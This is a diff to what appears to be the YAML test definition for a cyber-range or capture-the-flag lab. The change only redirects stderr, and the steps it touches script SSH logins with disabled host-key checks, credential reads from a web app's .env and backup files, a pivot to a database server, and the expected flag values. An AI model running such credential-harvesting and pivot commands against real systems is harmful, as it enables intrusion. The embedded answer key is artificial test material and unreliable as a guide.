@@ -102,27 +102,27 @@ topology:
 test:
   steps:
     - name: "SSH to web server as webdev"
-      command: "sshpass -p '{cred.webdev.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.webdev.user}@{target.webserver} 'whoami' 2>/dev/null"
+      command: "sshpass -p '{cred.webdev.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.webdev.user}@{target.webserver} 'whoami' 2>&1"
       expect: "webdev"
       timeout: 15
 
     - name: "Discover application config with database credentials"
-      command: "sshpass -p '{cred.webdev.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.webdev.user}@{target.webserver} 'cat /var/www/crestline-portal/.env 2>/dev/null | grep DB_PASS' 2>/dev/null"
+      command: "sshpass -p '{cred.webdev.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.webdev.user}@{target.webserver} 'cat /var/www/crestline-portal/.env 2>/dev/null | grep DB_PASS' 2>&1"
       expect: "F1n4nc3_DB_Pr0d#"
       timeout: 15
 
     - name: "Find flag part 1 on web server"
-      command: "sshpass -p '{cred.webdev.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.webdev.user}@{target.webserver} 'cat /var/www/crestline-portal/config/api_keys.bak 2>/dev/null | grep -o \"assessment_token=[a-z0-9_]*\" | sed \"s/^assessment_token=//\"' 2>/dev/null"
+      command: "sshpass -p '{cred.webdev.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.webdev.user}@{target.webserver} 'cat /var/www/crestline-portal/config/api_keys.bak 2>/dev/null | grep -o \"assessment_token=[a-z0-9_]*\" | sed \"s/^assessment_token=//\"' 2>&1"
       expect: "cr3d"
       timeout: 15
 
     - name: "Pivot to database server using discovered credentials"
-      command: "sshpass -p '{cred.dbadmin.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.dbadmin.user}@{target.dbserver} 'whoami' 2>/dev/null"
+      command: "sshpass -p '{cred.dbadmin.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.dbadmin.user}@{target.dbserver} 'whoami' 2>&1"
       expect: "dbadmin"
       timeout: 15
 
     - name: "Find flag part 2 on database server"
-      command: "sshpass -p '{cred.dbadmin.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.dbadmin.user}@{target.dbserver} 'cat /home/dbadmin/maintenance/assessment_token.txt 2>/dev/null' 2>/dev/null"
+      command: "sshpass -p '{cred.dbadmin.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.dbadmin.user}@{target.dbserver} 'cat /home/dbadmin/maintenance/assessment_token.txt 2>/dev/null' 2>&1"
       expect: "p1v0t"
       timeout: 15
 
